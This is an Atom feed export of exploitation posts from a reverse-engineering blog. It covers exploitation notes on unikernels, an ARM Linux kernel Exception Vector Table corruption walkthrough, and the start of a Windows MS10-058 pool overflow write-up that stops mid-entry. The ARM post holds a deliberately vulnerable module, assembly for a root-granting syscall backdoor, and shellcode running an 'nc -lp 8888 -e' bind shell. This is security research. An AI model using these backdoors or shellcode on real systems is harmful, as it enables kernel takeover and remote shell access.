<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: exploitation | Diary of a reverse-engineer]]></title>
  <link href="http://doar-e.github.io/blog/categories/exploitation/atom.xml" rel="self"/>
  <link href="http://doar-e.github.io/"/>
  <updated>2017-09-06T06:47:31-07:00</updated>
  <id>http://doar-e.github.io/</id>
  <author>
    <name><![CDATA[Axel Souchet, Jonathan Salwan, Jérémy Fetiveau]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[happy unikernels]]></title>
    <link href="http://doar-e.github.io/blog/2016/12/21/happy-unikernels/"/>
    <updated>2016-12-21T18:59:00-08:00</updated>
    <id>http://doar-e.github.io/blog/2016/12/21/happy-unikernels</id>
    <content type="html"><![CDATA[<h1>Intro</h1>

<p>Below is a collection of notes regarding unikernels. I had originally prepared this stuff to submit to EkoParty’s CFP, but ended up not wanting to devote time to stabilizing PHP7’s heap structures and I lost interest in the rest of the project before it was complete. However, there are still some cool takeaways I figured I could write down. Maybe they’ll come in handy? If so, please let let me know.</p>

<p>Unikernels are a continuation of turning everything into a container or VM. Basically, as many VMs currently just run one userland application, the idea is that we can simplify our entire software stack by removing the userland/kernelland barrier and essentially compiling our usermode process into the kernel. This is, in the implementation I looked at, done with a NetBSD kernel and a variety of either <a href="https://github.com/rumpkernel/rumprun-packages">native or lightly-patched POSIX applications</a>  (bonus: there is significant lag time between upstream fixes and rump package fixes, just like every other containerized solution).</p>

<p>While I don’t necessarily think that conceptually unikernels are a good idea (attack surface reduction vs mitigation removal), I do think people will start more widely deploying them shortly and I was curious what memory corruption exploitation would look like inside of them, and more generally what your payload options are like.</p>

<p>All of the following is based off of two unikernel programs, nginx and php5 and only makes use of public vulnerabilities. I am happy to provide all referenced code (in varying states of incompleteness), on request.</p>

<div class='entry-content-toc'></div>




<!--more-->


<h1>Basic ‘Hello World’ Example</h1>

<p>To get a basic understanding of a unikernel, we’ll walk through a simple ‘Hello World’ example. First, you’ll need to clone and build (<code>./build-rr.sh</code>) the <a href="https://github.com/rumpkernel/rumprun">rumprun</a> toolchain. This will set you up with the various utilities you&rsquo;ll need.</p>

<h2>Compiling and ‘Baking’</h2>

<p>In a rumpkernel application, we have a standard POSIX environment, minus anything involving multiple processes. Standard memory, file system, and networking calls all work as expected. The only differences lie in the multi-process related calls such as <code>fork()</code>, <code>signal()</code>, <code>pthread_create()</code>, etc. The scope of these differences can be found in the <a href="http://www.fixup.fi/misc/rumpkernel-book/rumpkernel-bookv2-20160802.pdf">The Design and Implementation of the Anykernel and Rump Kernels [pdf]</a>.</p>

<p>From a super basic, standard ‘hello world’ program:</p>

<p>```c</p>

<h1>include &lt;stdio.h></h1>

<p>void main(void)
{
   printf(&ldquo;Hello\n&rdquo;);
}
```</p>

<p>After building <code>rumprun</code> we should have a new compiler, <code>x86_64-rumprun-netbsd-gcc</code>. This is a cross compiler targeting the rumpkernel platform. We can compile as normal <code>x86_64-rumprun-netbsd-gcc hello.c -o hello-rump</code> and in fact the output is an ELF: <code>hello-rump: ELF 64-bit LSB relocatable, x86-64, version 1 (SYSV), not stripped</code>. However, as we obviously cannot directly boot an ELF we must manipulate the executable (&lsquo;baking&rsquo; in rumpkernel terms).</p>

<p>Rump kernels provide a <code>rumprun-bake</code> shell script. This script takes an ELF from compiling with the rumprun toolchain and converts it into a bootable image which we can then give to qemu or xen. Continuing in our example: <code>rumprun-bake hw_generic hello.bin hello-rump</code>, where the <code>hw_generic</code> just indicates we are targeting qemu.</p>

<h2>Booting and Debugging</h2>

<p>At this point assuming you have qemu installed, booting your new image should be as easy as <code>rumprun qemu -g "-curses" -i hello.bin</code>. If everything went according to plan, you should see something like:</p>

<p><img src="http://i.imgur.com/Or38ajp.png" alt="hello" /></p>

<p>Because this is just qemu at this point, if you need to debug you can easily attach via qemu’s system debugger. Additionally, a nice side effect of this toolchain is very easy debugging — you can essentially debug most of your problems on the native architecture, then just switch compilers to build a bootable image. Also, because the boot time is so much faster, debugging and fixing problems is vastly sped up.</p>

<p>If you have further questions, or would like more detail, the <a href="https://github.com/rumpkernel/wiki">Rumpkernel Wiki</a> has some very good documents explaining the various components and options.</p>

<h1>Peek/Poke Tool</h1>

<p>Initially to develop some familiarity with the code, I wrote a simple peek/poke primitive process. The VM would boot and expose a tcp socket that would allow clients read or write arbitrary memory, as well as wrappers around <code>malloc()</code> and <code>free()</code> to play with the heap state. Most of the knowledge here is derived from this test code, poking at it with a debugger, and reading the rump kernel source.</p>

<h2>Memory Protections</h2>

<p>One of the benefits of unikernels is you can prune components you might not need. For example, if your unikernel application does not touch the filesystem, that code can be removed from your resulting VM. One interesting consequence of this involves only running one process — because there is only one process running on the VM, there is no need for a virtual memory system to separate address spaces by process.</p>

<p>Right now this means that all memory is read-write-execute. I&rsquo;m not sure if it&rsquo;s possible to configure the MMU in a hypervisor to enforce memory proections without enabling virtual memory, as most of the virtual memory code I&rsquo;ve looked at has been related to process separation with page tables, etc. In any case, currently it’s pretty trivial to introduce new code into the system and there shouldn’t be much need to resort to ROP.</p>

<h1>nginx</h1>

<p>Nginx was the first target I looked at; I figured I could dig up the stack smash from 2013 (CVE-2013-2028) and use that as a baseline exploit to see what was possible. This ultimately failed, but exposed some interesting things along the way.</p>

<h2>Reason Why This Doesn’t Work</h2>

<p>CVE-2013-2028 is a stack buffer overflow in the nginx handler for chunked requests. I thought this would be a good test as the user controls much of the data on the stack, however, various attempts to trigger the overflow failed. Running the VM in a debugger you could see the bug was not triggered despite the size value being large enough. In fact, the syscall returned an error.</p>

<p>It turns out however that NetBSD has code to prevent against this inside the kernel:</p>

<p>```c
do_sys_recvmsg_so(struct lwp <em>l, int s, struct socket </em>so, struct msghdr *mp,</p>

<pre><code>  struct mbuf **from, struct mbuf **control, register_t *retsize) {
</code></pre>

<p>// …</p>

<pre><code>    if (tiov-&gt;iov_len &gt; SSIZE_MAX || auio.uio_resid &gt; SSIZE_MAX) {
        error = EINVAL;
        goto out;
    }
</code></pre>

<p>// …
```</p>

<p>iov_len is our <code>recv()</code> size parameter, so this bug is dead in the water. As an aside, this also made me wonder how Linux applications would respond if you passed a size greater than LONG_MAX into <code>recv()</code> and it succeeded…</p>

<h2>Something Interesting</h2>

<p>Traditionally when exploiting this bug one has to worry about stack cookies. Nginx has a worker pool of processes forked from the main process. In the event of a crash, a new process will be forked from the parent, meaning that the stack cookie will remain constant across subsequent connections. This allows you to break it down into four, 1 byte brute forces as opposed to one 4 byte, meaning it can be done in a maximum of 1024 connections. However, inside the unikernel, there is only one process — if a process crashes the entire VM must be restarted, and because the only process is the kernel, the stack cookie should (in theory) be regenerated. Looking at the disassembled nginx code, you can see the stack cookie checks in all off the relevant functions.</p>

<p>In practice, the point is moot because the stack cookies are always zero. The compiler creates and checks the cookies, it just never populates <code>fs:0x28</code> (the location of the cookie value), so it’s always a constant value and assuming you can write null bytes, this should pose no problem.</p>

<h1>ASLR</h1>

<p>I was curious if unikernels would implement some form of ASLR, as during the build process they get compiled to an ELF (which is quite nice for analysis!) which might make position independent code easier to deal with. They don’t: all images are loaded at <code>0x100000</code>. There is however &ldquo;natures ASLR&rdquo; as these images aren’t distributed in binary form. Thus, as everyone must compile their own images, these will vary slightly depending on compiler version, software version, etc. However, even this constraint gets made easier. If you look at the format of the loaded images, they look something like this:</p>

<p><code>
0x100000: &lt;unikernel init code&gt;
…
0x110410: &lt;application code starts&gt;
</code></p>

<p>This means across any unikernel application you’ll have approximately 0x10000 bytes of fixed value, fixed location executable memory. If you find an exploitable bug it should be possible to construct a payload entirely from the code in this section. This payload could be used to leak the application code, install persistence, whatever.</p>

<h1>PHP</h1>

<p>Once nginx was off the table, I needed another application that had a rumpkernel package and a history of exploitable bugs. The PHP interpreter fits the bill. I ended up using Sean Heelan&rsquo;s PHP bug <a href="https://bugs.php.net/bug.php?id=70068">#70068</a>, because of the provided trigger in the bug description, and detailed description explaining the bug. Rather than try to poorly recap Sean&rsquo;s work, I&rsquo;d encourage you to just read the inital report if you&rsquo;re curious about the bug.</p>

<p>In retrospect, I took a poor exploitation path for this bug. Because the heap slabs have no ASLR, you can fairly confidently predict mapped addresses inside the PHP interpreter. Furthermore, by controlling the size of the payload, you can determine which bucket it will fall into and pick a lesser used bucket for more stability. This allows you to be lazy, and hard code payload addresses, leading to easy exploitation. This works very well &mdash; I was basically able to take Sean&rsquo;s trigger, slap some addresses and a payload into it, and get code exec out of it. However, the downsides to this approach quickly became apparent. When trying to return from my payload and leave the interpreter in a sane state (as in, running) I realized that I would need to actually understand the PHP heap to repair it. I started this process by examining the rump heap (see below), but got bored when I ended up in the PHP heap.</p>

<h1>Persistence</h1>

<p>This was the portion I wanted to finish for EkoParty, and it didn’t get done. In theory, as all memory is read-write-execute, it should be pretty trivial to just patch <code>recv()</code> or something to inspect the data received, and if matching some constant execute the rest of the packet. This is strictly in memory, anything touching disk will be application specific.</p>

<p>Assuming your payload is stable, you should be able to install an in-memory backdoor which will persist for the runtime of that session (and be deleted on poweroff). While in many configurations there is no writable persistent storage which will survive reboots this is not true for all unikernels (e.g. mysql). In those cases it might be possible to persist across power cycles, but this will be application specific.</p>

<p>One final, and hopefully obvious note: one of the largest differences in exploitation of unikernels is the lack of multiple processes. Exploits frequently use the existence of multiple processes to avoid cleaning up application state after a payload is run. In a unikernel, your payload must repair application state or crash the VM. In this way it is much more similar to a kernel exploit.</p>

<h1>Heap Notes</h1>

<p>The unikernel heap is quite nice from an exploitation perspective. It&rsquo;s a slab-style allocator with in-line metadata on every block. Specifically, the metadata contains the ‘bucket’ the allocation belongs to (and thus the freelist the block should be released to). This means a relative overwrite plus <code>free()</code>ing into a smaller bucket should allow for fairly fine grained control of contents. Additionally the heap is LIFO, allowing for standard heap massaging.</p>

<p>Also, while kinda untested, I believe rumpkernel applications are compiled without <code>QUEUEDEBUG</code> defined. This is relevant as the sanity checks on <code>unlink</code> operations (&ldquo;safe unlink&rdquo;) require this to be defined. This means that in some cases, if freelists themselves can be overflown then removed you can get a write-what-where. However, I think this is fairly unlikely in practice, and with the lack of memory protections elsewhere, I&rsquo;d be surprised if it would currently be useful.</p>

<p>You can find most of the relevant heap source <a href="https://github.com/rumpkernel/rumprun/blob/master/lib/libbmk_core/memalloc.c">here</a></p>

<h1>Symbol Resolution</h1>

<p>Rumpkernels helpfully include an entire syscall table under the <code>mysys</code> symbol. When rumpkernel images get loaded, the ELF header gets stripped, but the rest of the memory is loaded contigiously:</p>

<p>```
gef➤  info file
Symbols from &ldquo;/home/x/rumprun-packages/php5/bin/php.bin&rdquo;.
Remote serial target in gdb-specific protocol:
Debugging a target over a serial line.</p>

<pre><code>    While running this, GDB does not access memory from...
</code></pre>

<p>Local exec file:</p>

<pre><code>    `/home/x/rumprun-packages/php5/bin/php.bin', file type elf64-x86-64.
    Entry point: 0x104000
    0x0000000000100000 - 0x0000000000101020 is .bootstrap
    0x0000000000102000 - 0x00000000008df31c is .text
    0x00000000008df31c - 0x00000000008df321 is .init
    0x00000000008df340 - 0x0000000000bba9f0 is .rodata
    0x0000000000bba9f0 - 0x0000000000cfbcd0 is .eh_frame
    0x0000000000cfbcd0 - 0x0000000000cfbd28 is link_set_sysctl_funcs
    0x0000000000cfbd28 - 0x0000000000cfbd50 is link_set_bufq_strats
    0x0000000000cfbd50 - 0x0000000000cfbde0 is link_set_modules
    0x0000000000cfbde0 - 0x0000000000cfbf18 is link_set_rump_components
    0x0000000000cfbf18 - 0x0000000000cfbf60 is link_set_domains
    0x0000000000cfbf60 - 0x0000000000cfbf88 is link_set_evcnts
    0x0000000000cfbf88 - 0x0000000000cfbf90 is link_set_dkwedge_methods
    0x0000000000cfbf90 - 0x0000000000cfbfd0 is link_set_prop_linkpools
    0x0000000000cfbfd0 - 0x0000000000cfbfe0 is .initfini
    0x0000000000cfc000 - 0x0000000000d426cc is .data
    0x0000000000d426d0 - 0x0000000000d426d8 is .got
    0x0000000000d426d8 - 0x0000000000d426f0 is .got.plt
    0x0000000000d426f0 - 0x0000000000d42710 is .tbss
    0x0000000000d42700 - 0x0000000000e57320 is .bss
</code></pre>

<p>```</p>

<p>This means you should be able to just run simple linear scan, looking for the <code>mysys</code> table. A basic heuristic should be fine, 8 byte syscall number, 8 byte address. In the PHP5 interpreter, this table has 67 entries, giving it a big, fat footprint:</p>

<p><code>
gef➤  x/6g mysys
0xaeea60 &lt;mysys&gt;:       0x0000000000000003      0x000000000080b790 -- &lt;sys_read&gt;
0xaeea70 &lt;mysys+16&gt;:    0x0000000000000004      0x000000000080b9d0 -- &lt;sys_write&gt;
0xaeea80 &lt;mysys+32&gt;:    0x0000000000000006      0x000000000080c8e0 -- &lt;sys_close&gt;
...
</code></p>

<p>There is probably a chain of pointers in the initial constant 0x10410 bytes you could also follow, but this approach should work fine.</p>

<h1>Hypervisor fuzzing</h1>

<p>After playing with these for a while, I had another idea: rather than using unikernels to host userland services, I think there is a really cool opportunity to write a hypervisor fuzzer in a unikernel. Consider:
You have all the benefits of a POSIX userland only you’re in ring0. You don’t need to export your data to userland to get easy and familiar IO functions.
Unikernels boot really, really fast. As in under 1 second. This should allow for pretty quick state clearing.</p>

<p>This is definitely an area of interesting future work I’d like to come back to.</p>

<h1>Final Suggestions</h1>

<p>If you develop unikernels:</p>

<ul>
<li>Populate the randomness for stack cookies.</li>
<li>Load at a random location for some semblance of ASLR.</li>
<li>Is there a way you can enforce memory permissions? Some form of NX would go a long way.</li>
<li>If you can’t, some control flow integrity stuff might be a good idea? Haven’t really thought this through or tried it.</li>
<li>Take as many lessons from grsec as possible.</li>
</ul>


<p>If you’re exploiting unikernels:</p>

<ul>
<li>Have fun.</li>
</ul>


<p>If you’re exploiting hypervisors:</p>

<ul>
<li>Unikernels might provide a cool platform to easily play in ring0.</li>
</ul>


<h2>Thanks</h2>

<p>For feedback, bugs used, or editing
<a href="https://twitter.com/seanhn">@seanhn</a>, <a href="https://twitter.com/hugospns">@hugospns</a>, <a href="https://twitter.com/0vercl0k">@0vercl0k</a>, <a href="https://twitter.com/darkarnium">@darkarnium</a>, other quite helpful anonymous types.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Corrupting the ARM Exception Vector Table]]></title>
    <link href="http://doar-e.github.io/blog/2014/04/30/corrupting-arm-evt/"/>
    <updated>2014-04-30T21:01:00-07:00</updated>
    <id>http://doar-e.github.io/blog/2014/04/30/corrupting-arm-evt</id>
    <content type="html"><![CDATA[<h1>Introduction</h1>

<p>A few months ago, I was writing a Linux kernel exploitation challenge on ARM in an attempt to learn about kernel exploitation and I thought I&rsquo;d explore things a little. I chose the ARM architecture mainly because I thought it would be fun to look at. This article is going to describe how the ARM Exception Vector Table (EVT) can aid in kernel exploitation in case an attacker has a write what-where primitive. It will be covering a local exploit scenario as well as a remote exploit scenario. Please note that corrupting the EVT has been mentioned in the paper &ldquo;Vector Rewrite Attack&rdquo;<a href="http://cansecwest.com/slides07/Vector-Rewrite-Attack.pdf">[1]</a>, which briefly talks about how it can be used in NULL pointer dereference vulnerabilities on an ARM RTOS.</p>

<p>The article is broken down into two main sections. First a brief description of the ARM EVT and its implications from an exploitation point of view (please note that a number of things about the EVT will be omitted to keep this article relatively short). We will go over two examples showing how we can abuse the EVT.</p>

<p>I am assuming the reader is familiar with Linux kernel exploitation and knows some ARM assembly (seriously).</p>

<div class='entry-content-toc'></div>




<!--more-->


<h1>ARM Exceptions and the Exception Vector Table</h1>

<p>In a few words, the EVT is to ARM what the IDT is to x86. In the ARM world, an exception is an event that causes the CPU to stop or pause from executing the current set of instructions. When this exception occurs, the CPU diverts execution to another location called an exception handler. There are 7 exception types and each exception type is associated with a mode of operation. Modes of operation affect the processor&rsquo;s &ldquo;permissions&rdquo; in regards to system resources. There are in total 7 modes of operation. The following table maps some exception types to their associated modes of operation:</p>

<pre><code> Exception                   |       Mode            |     Description
 ----------------------------|-----------------------|-------------------------------------------------------------------
 Fast Interrupt Request      |      FIQ              |   interrupts requiring fast response and low latency.
 Interrupt Request           |      IRQ              |   used for general-purpose interrupt handling.
 Software Interrupt or RESET |      Supervisor Mode  |   protected mode for the operating system.
 Prefetch or Data Abort      |      Abort Mode       |   when fetching data or an instruction from invalid/unmmaped memory.
 Undefined Instruction       |      Undefined Mode   |   when an undefined instruction is executed.
</code></pre>

<p>The other two modes are User Mode which is self explanatory and System Mode which is a privileged user mode for the operating system</p>

<h2>The Exceptions</h2>

<p>The exceptions change the processor mode and each exception has access to a set of <em>banked</em> registers. These can be described as a set of registers that exist only in the exception&rsquo;s context so modifying them will not affect the banked registers of another exception mode. Different exception modes have different banked registers:<br/>
<img src="/images/corrupting_arm_evt/banked_regs.png" alt="Banked Registers" /></p>

<h2>The Exception Vector Table</h2>

<p>The vector table is a table that actually contains control transfer instructions that jump to the respective exception handlers. For example, when a software interrupt is raised, execution is transfered to the software interrupt entry in the table which in turn will jump to the syscall handler. Why is the EVT so interesting to target? Well because it is loaded at a known address in memory and it is writeable* and executable. On 32-bit ARM Linux this address is <strong>0xffff0000</strong>. Each entry in the EVT is also at a known offset as can be seen on the following table:</p>

<pre><code> Exception                   |       Address            
 ----------------------------|-----------------------
 Reset                       |      0xffff0000           
 Undefined Instruction       |      0xffff0004       
 SWI                         |      0xffff0008  
 Prefetch Abort              |      0xffff000c       
 Data Abort                  |      0xffff0010 
 Reserved                    |      0xffff0014  
 IRQ                         |      0xffff0018   
 FIQ                         |      0xffff001c  
</code></pre>

<h3>A note about the Undefined Instruction exception</h3>

<p>Overwriting the Undefiend Instruction vector seems like a great plan but it actually isn&rsquo;t because it is used by the kernel. <em>Hard float</em> and <em>Soft float</em> are two solutions that allow emulation of floating point instructions since a lot of ARM platforms do not have hardware floating point units. With soft float, the emulation code is added to the userspace application at compile time. With hard float, the kernel lets the userspace application use the floating point instructions as if the CPU supported them and then using the Undefined Instruction exception, it emulates the instruction inside the kernel.</p>

<p>If you want to read more on the EVT, checkout the references at the bottom of this article, or google it.</p>

<h1>Corrupting the EVT</h1>

<p>There are few vectors we could use in order to obtain privileged code execution. Clearly, overwriting any vector in the table could potentially lead to code execution, but as the lazy people that we are, let&rsquo;s try to do the least amount of work. The easiest one to overwrite seems to be the Software Interrupt vector. It is executing in process context, system calls go through there, all is well. Let&rsquo;s now go through some PoCs/examples. All the following examples have been tested on Debian 7 ARMel 3.2.0-4-versatile running in qemu.</p>

<h2>Local scenario</h2>

<p>The example vulnerable module implements a char device that has a pretty blatant arbitrary-write vulnerability( or is it a feature?):
```c
/ called when &lsquo;write&rsquo; system call is done on the device file
static ssize_t on_write(struct file <em>filp,const char </em>buff,size_t len,loff_t *off)
{</p>

<pre><code>size_t siz = len;
void * where = NULL;
char * what = NULL;

if(siz &gt; sizeof(where))
    what = buff + sizeof(where);
else
    goto end;

copy_from_user(&amp;where, buff, sizeof(where));
memcpy(where, what, sizeof(void *));
</code></pre>

<p>end:</p>

<pre><code>return siz;
</code></pre>

<p>}
```
Basically, with this cool and realistic vulnerability, you give the module an address followed by data to write at that address.
Now, our plan is going to be to backdoor the kernel by overwriting the SWI exception vector with code that jumps to our backdoor code. This code will check for a magic value in a register (say r7 which holds the syscall number) and if it matches, it will elevate the privileges of the calling process. Where do we store this backdoor code ? Considering the fact that we have an arbitrary write to kernel memory, we can either store it in userspace or somewhere in kernel space. The good thing about the latter choice is that if we choose an appropriate location in kernel space, our code will exist as long as the machine is running, whereas with the former choice, as soon as our user space application exits, the code is lost and if the entry in the EVT isn&rsquo;t set back to its original value, it will most likely be pointing to invalid/unmmapped memory which will crash the system. So we need a location in kernel space that is executable and writeable. Where could this be ? Let&rsquo;s take a closer look at the EVT:<br/>
<img src="/images/corrupting_arm_evt/evt_8i.png" alt="EVT Disassembly" /><br/>
As expected we see a bunch of control transfer instructions but one thing we notice about them is that &ldquo;closest&rdquo; referenced address is <em>0xffff0200</em>. Let&rsquo;s take a look what is between the end of the EVT and 0xffff0200:<br/>
<img src="/images/corrupting_arm_evt/evt_400wx.png" alt="EVT Inspection" /><br/>
It looks like nothing is there so we have around 480 bytes to store our backdoor which is more than enough.</p>

<h3>The Exploit</h3>

<p>Recapitulating our exploit:</p>

<pre><code>1. Store our backdoor at *0xffff0020*.  
2. Overwrite the SWI exception vector with a branch to *0xffff0020*.  
3. When a system call occurs, our backdoor will check if r7 == 0xb0000000 and if true, elevate the privileges of the calling process otherwise jump to the normal system call handler.  
</code></pre>

<p>Here is the backdoor&rsquo;s code:
```nasm
@ check if magic</p>

<pre><code>cmp     r7, #0xb0000000
bne     exit
</code></pre>

<p>elevate:</p>

<pre><code>stmfd   sp!,{r0-r12}

mov     r0, #0
ldr     r3, =0xc0049a00     @ prepare_kernel_cred
blx     r3
ldr     r4, =0xc0049438     @ commit_creds
blx     r4

ldmfd   sp!, {r0-r12, pc}^  @ return to userland
</code></pre>

<p>@ go to syscall handler
exit:</p>

<pre><code>ldr     pc, [pc, #980]      @ go to normal swi handler
</code></pre>

<p>```
You can find the complete code for the vulnerable module and the exploit <a href="https://github.com/acama/arm-evt/tree/master/local_example">here</a>. Run the exploit:<br/>
<img src="/images/corrupting_arm_evt/local_poc.png" alt="Local PoC" /></p>

<h2>Remote scenario</h2>

<p>For this example, we will use a netfilter module with a similar vulnerability as the previous one:
```c</p>

<pre><code>if(ip-&gt;protocol == IPPROTO_TCP){
    tcp = (struct tcphdr *)(skb_network_header(skb) + ip_hdrlen(skb));
    currport = ntohs(tcp-&gt;dest);
    if((currport == 9999)){
        tcp_data = (char *)((unsigned char *)tcp + (tcp-&gt;doff * 4));
        where = ((void **)tcp_data)[0];
        len = ((uint8_t *)(tcp_data + sizeof(where)))[0];
        what = tcp_data + sizeof(where) + sizeof(len);
        memcpy(where, what, len);
    }
}
</code></pre>

<p>```
Just like the previous example, this module has an awesome feature that allows you to write data to anywhere you want. Connect on port tcp/9999 and just give it an address, followed by the size of the data and the actual data to write there. In this case we will also backdoor the kernel by overwriting the SWI exception vector and backdooring the kernel. The code will branch to our shellcode which we will also, as in the previous example, store at <em>0xffff020</em>. Overwriting the SWI vector is especially a good idea in this remote scenario because it will allow us to switch from interrupt context to process context. So our backdoor will be executing in a context with a backing process and we will be able to &ldquo;hijack&rdquo; this process and overwrite its code segment with a bind shell or connect back shell. But let&rsquo;s not do it that way. Let&rsquo;s check something real quick:<br/>
<img src="/images/corrupting_arm_evt/proc_self_maps.png" alt="cat /proc/self/maps" /><br/>
Would you look at that, on top of everything else, the EVT is a shared memory segment. It is executable from user land and writeable from kernel land*. Instead of overwriting the code segment of a process that is making a system call, let&rsquo;s just store our code in the EVT right after our first stage and just return there.
Every system call goes through the SWI vector so we won&rsquo;t have to wait too much for a process to get caught in our trap.</p>

<h3>The Exploit</h3>

<p>Our exploit goes:</p>

<pre><code>1. Store our first stage and second stage shellcodes at *0xffff0020* (one after the other).  
2. Overwrite the SWI exception vector with a branch to *0xffff0020*.  
3. When a system call occurs, our first stage shellcode will set the link register to the address of our second stage shellcode (which is also stored in the EVT and which will be executed from userland), and then return to userland.  
4. The calling process will "resume execution" at the address of our second stage which is just a bind shell.  
</code></pre>

<p>Here is the stage 1-2 shellcode:</p>

<p>```nasm
stage_1:</p>

<pre><code>adr     lr, stage_2
push    {lr}
stmfd   sp!, {r0-r12}
ldr     r0, =0xe59ff410     @ intial value at 0xffff0008 which is
                            @ ldr     pc, [pc, #1040] ; 0xffff0420
ldr     r1, =0xffff0008
str     r0, [r1]
ldmfd   sp!, {r0-r12, pc}^  @ return to userland
</code></pre>

<p>stage_2:</p>

<pre><code>ldr     r0, =0x6e69622f     @ /bin
ldr     r1, =0x68732f2f     @ /sh
eor     r2, r2, r2          @ 0x00000000
push    {r0, r1, r2}
mov     r0, sp

ldr     r4, =0x0000632d     @ -c\x00\x00
push    {r4}
mov     r4, sp

ldr     r5, =0x2d20636e
ldr     r6, =0x3820706c
ldr     r7, =0x20383838     @ nc -lp 8888 -e /bin//sh
ldr     r8, =0x2f20652d
ldr     r9, =0x2f6e6962
ldr     r10, =0x68732f2f

eor     r11, r11, r11
push    {r5-r11}
mov     r5, sp
push    {r2}

eor     r6, r6, r6
push    {r0,r4,r5, r6}
mov     r1, sp
mov     r7, #11
swi     0x0

mov     r0, #99
mov     r7, #1
swi     0x0
</code></pre>

<p>```</p>

<p>You can find the complete code for the vulnerable module and the exploit <a href="https://github.com/acama/arm-evt/tree/master/remote_example">here</a>. Run the exploit:<br/>
<img src="/images/corrupting_arm_evt/remote_poc.png" alt="Remote PoC" /></p>

<h2>Bonus: Interrupt Stack Overflow</h2>

<p>It seems like the Interrupt Stack is adjacent to the EVT in most memory layouts. Who knows what kind of interesting things would happen if there was something like a stack overflow ?</p>

<h1>A Few Things about all this</h1>

<ul>
<li>The techniques discussed in this article make the assumption that the attack has knowledge of the kernel addresses which might not always be the case.</li>
<li>The location where we are storing our shellcode (<em>0xffff0020</em>) might or might not be used by another distro&rsquo;s kernel.</li>
<li>The exampe codes I wrote here are merely PoCs; they could definitely be improved. For example, on the remote scenario, if it turns out that the init process is the process being hijacked, the box will crash after we exit from the bind shell.</li>
<li>If you hadn&rsquo;t noticed, the &ldquo;vulnerabilities&rdquo; presented here, aren&rsquo;t really vulnerabilities but that is not the point of this article.</li>
</ul>


<p> *: It seems like the EVT can be mapped read-only and therfore there is the possibility that it might not be writeable in newer/some versions of the Linux kernel.</p>

<h1>Final words</h1>

<p>Among other things, <a href="http://grsecurity.net/">grsec</a> prevents the modification of the EVT by making the page read-only.
If you want to play with some fun kernel challenges checkout the &ldquo;kernelpanic&rdquo; branch on <a href="http://w3challs.com/challenges/wargame">w3challs</a>.<br/>
Cheers, <a href="https://twitter.com/amatcama">@amatcama</a></p>

<h1>References</h1>

<p>[1] <a href="http://cansecwest.com/slides07/Vector-Rewrite-Attack.pdf">Vector Rewrite Attack</a><br/>
[2] <a href="https://forums.grsecurity.net/viewtopic.php?f=7&amp;t=3292">Recent ARM Security Improvements</a><br/>
[3] <a href="http://infocenter.arm.com/help/index.jsp?topic=/com.arm.doc.ddi0311d/I30195.html">Entering an Exception</a><br/>
[4] <a href="http://infocenter.arm.com/help/index.jsp?topic=/com.arm.doc.dui0040d/Cacdfeci.html">SWI handlers</a><br/>
[5] <a href="http://osnet.cs.nchu.edu.tw/powpoint/Embedded94_1/Chapter%207%20ARM%20Exceptions.pdf">ARM Exceptions</a><br/>
[6] <a href="http://www.iti.uni-stuttgart.de/~radetzki/Seminar06/08_report.pdf">Exception and Interrupt Handling in ARM</a></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[First dip into the kernel pool : MS10-058]]></title>
    <link href="http://doar-e.github.io/blog/2014/03/11/first-dip-into-the-kernel-pool-ms10-058/"/>
    <updated>2014-03-11T02:52:37-07:00</updated>
    <id>http://doar-e.github.io/blog/2014/03/11/first-dip-into-the-kernel-pool-ms10-058</id>
    <content type="html"><![CDATA[<h1>Introduction</h1>

<p>I am currently playing with pool-based memory corruption vulnerabilities. That’s why I wanted to program a PoC exploit for the vulnerability presented by Tarjei Mandt during his first talk “Kernel Pool Exploitation on Windows 7” <a href="http://www.mista.nu/research/MANDT-kernelpool-PAPER.pdf">[3]</a>. I think it&rsquo;s a good exercise to start learning about pool overflows.</p>

<h1>Forewords</h1>

<p>If you want to experiment with this vulnerability, you should read <a href="http://www.itsecdb.com/oval/definition/oval/gov.nist.USGCB.patch/def/11689/MS10-058-Vulnerabilities-in-TCP-IP-Could-Allow-Elevation-of.html">[1]</a> and be sure to have a vulnerable system. I tested my exploit on a VM with Windows 7 32 bits with tcpip.sys 6.1.7600.16385. The Microsoft bulletin dealing with this vulnerability is MS10-058. It has been found by Matthieu Suiche <a href="http://technet.microsoft.com/fr-fr/security/bulletin/ms10-058">[2]</a> and was used as an example on Tarjei Mandt’s paper <a href="http://www.mista.nu/research/MANDT-kernelpool-PAPER.pdf">[3]</a>.</p>

<h1>Triggering the flaw</h1>

<p>An integer overflow in <em>tcpip!IppSortDestinationAddresses</em> allows to allocate a wrong-sized non-paged pool memory chunk. Below you can see the diff between the vulnerable version and the patched version.</p>

<p><img class="center" src="/images/MS10-058/diff.png"></p>

<div class='entry-content-toc'></div>




<!--more-->


<p>So basically the flaw is merely an integer overflow that triggers a pool overflow.</p>

<p><code>text
IppSortDestinationAddresses(x,x,x)+29   imul    eax, 1Ch
IppSortDestinationAddresses(x,x,x)+2C   push    esi
IppSortDestinationAddresses(x,x,x)+2D   mov     esi, ds:__imp__ExAllocatePoolWithTag@12
IppSortDestinationAddresses(x,x,x)+33   push    edi
IppSortDestinationAddresses(x,x,x)+34   mov     edi, 73617049h
IppSortDestinationAddresses(x,x,x)+39   push    edi   
IppSortDestinationAddresses(x,x,x)+3A   push    eax  
IppSortDestinationAddresses(x,x,x)+3B   push    ebx           
IppSortDestinationAddresses(x,x,x)+3C   call    esi ; ExAllocatePoolWithTag(x,x,x)
</code></p>

<p>You can reach this code using a <em>WSAIoctl</em> with the code <em>SIO_ADDRESS_LIST_SORT</em> using a call like this :</p>

<p><code>text
WSAIoctl(sock, SIO_ADDRESS_LIST_SORT, pwn, 0x1000, pwn, 0x1000, &amp;cb, NULL, NULL)
</code>
You have to pass the function a pointer to a <em>SOCKET_ADDRESS_LIST</em> (<em>pwn</em> in the example). This <em>SOCKET_ADDRESS_LIST</em> contains an <em>iAddressCount</em> field and <em>iAddressCount</em> <em>SOCKET_ADDRESS</em> structures. With a high <em>iAddressCount</em> value, the integer will wrap, thus triggering the wrong-sized allocation.  We can almost write anything in those structures. There are only two limitations :</p>

<p>```text
IppFlattenAddressList(x,x)+25   lea     ecx, [ecx+ebx*8]
